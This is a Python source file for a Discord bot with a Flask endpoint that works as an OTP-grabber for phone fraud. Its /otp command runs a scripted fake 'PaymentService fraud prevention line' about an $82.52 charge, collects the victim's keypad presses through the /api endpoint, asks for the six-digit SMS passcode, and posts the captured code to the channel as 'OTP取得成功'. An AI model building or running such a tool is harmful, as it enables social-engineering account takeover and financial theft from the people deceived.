import disnake
from disnake.ext import commands
from flask import Flask,request
from threading import Thread
import sqlite3
import asyncio

memoryconn = sqlite3.connect("./manage.db")
mcur = memoryconn.cursor()
mcur.execute("CREATE TABLE IF NOT EXISTS num(id INTEGER PRIMARY KEY AUTOINCREMENT,phone_number text,number integer)")
mcur.execute("DELETE FROM num")
memoryconn.commit()

TOKEN = ""

# intent
intents = disnake.Intents.default()

sync_cmd = commands.CommandSyncFlags(sync_commands_debug=True)
bot = commands.InteractionBot(intents=intents,command_sync_flags=sync_cmd)


@bot.slash_command()
async def otp(inter):
  memoryconn = sqlite3.connect("./manage.db")
  mcur = memoryconn.cursor()
  await inter.response.send_message("OK",ephemeral=True)
  channel = inter.channel
  await channel.send("""```Hello, Dear John.
Thank you for using PaymentService.
This is the PaymentService fraud prevention line.
An unusual charge of $82.52 was made to your PaymentService account.
If this is your charge, please enter 1 on your keypad. We will block the charge.
If it is not, please type 2 on your keypad.```""")
  mcur.execute("DELETE FROM num WHERE phone_number=?",(str(inter.author.id),))
  memoryconn.commit()
  while True:
    mcur.execute("SELECT * FROM num WHERE phone_number=?",(str(inter.author.id),))
    fetchall_data = mcur.fetchall()
    if fetchall_data == []:
      None
    else:
      if fetchall_data[0][2] == 2:
        return
      elif fetchall_data[0][2] != 1:
        return
      else:
        mcur.execute("DELETE FROM num WHERE phone_number=?",(str(inter.author.id),))
        memoryconn.commit()
        break
    await asyncio.sleep(0.3)
  
  await channel.send("""```To verify your identity, please enter the 6-digit one-time passcode sent to the SMS of the phone number registered with PaymentService.```""")
  print("-----------------")
  otp_code = []
  while True:
    mcur.execute("SELECT * FROM num WHERE phone_number=?",(str(inter.author.id),))
    fetchall_data = mcur.fetchall()
    if fetchall_data == []:
      None
    else:
      otp_code.append(fetchall_data[0][2])
      print(otp_code)
      mcur.execute("DELETE FROM num WHERE id=?",(fetchall_data[0][0],))
      memoryconn.commit()
      if len(otp_code) == 6:
        break
    await asyncio.sleep(0.3)
  await channel.send("""```Thank you very much.
This billing will be blocked within 24-48 hours.
If you receive another unusual billing, we will ask you to go through the same process again for security reasons. Our apologies.```""")
  otp_str=""
  for i in otp_code:
    otp_str+=str(i)
  embed = disnake.Embed(title="OTP取得成功",color=0x0000ff,description=f"OTP CODE:{otp_str}")
  await channel.send(embed=embed)

  
  


app = Flask("")

@app.route("/")
def main():
  return "Hi"

@app.route('/api', methods=['GET'])
def get_number():
    memoryconn = sqlite3.connect("./manage.db")
    mcur = memoryconn.cursor()
    phone_number = str(request.args.get('phone', ''))
    insert_number = int(request.args.get('number', ''))
    mcur.execute("INSERT INTO num(phone_number,number) VALUES(?,?)",(phone_number,insert_number))
    memoryconn.commit()
    return "OK"



def run():
  app.run("0.0.0.0")


# ウェブサーバーを起動する
t = Thread(target=run)
t.start()

# Discordへ接続
bot.run(TOKEN)
